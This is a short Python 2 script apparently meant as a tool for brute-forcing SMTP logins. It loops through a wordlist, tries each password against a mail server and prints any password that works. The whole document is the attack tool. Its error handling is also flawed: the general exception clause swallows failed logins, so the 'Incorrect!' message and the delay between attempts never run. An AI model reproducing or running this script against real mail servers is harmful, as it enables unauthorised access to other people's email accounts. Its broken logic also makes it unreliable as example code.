import smtplib, sys
from time import sleep

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange


def smtpBruteforce(address, username, wordlist, delay, port):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            s = smtplib.SMTP(str(address), port)
            s.ehlo()
            s.starttls()
            s.ehlo
            s.login(str(username), str(password))
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            s.close()
        except Exception, e:
            print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the email address [!]" + W
        except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)
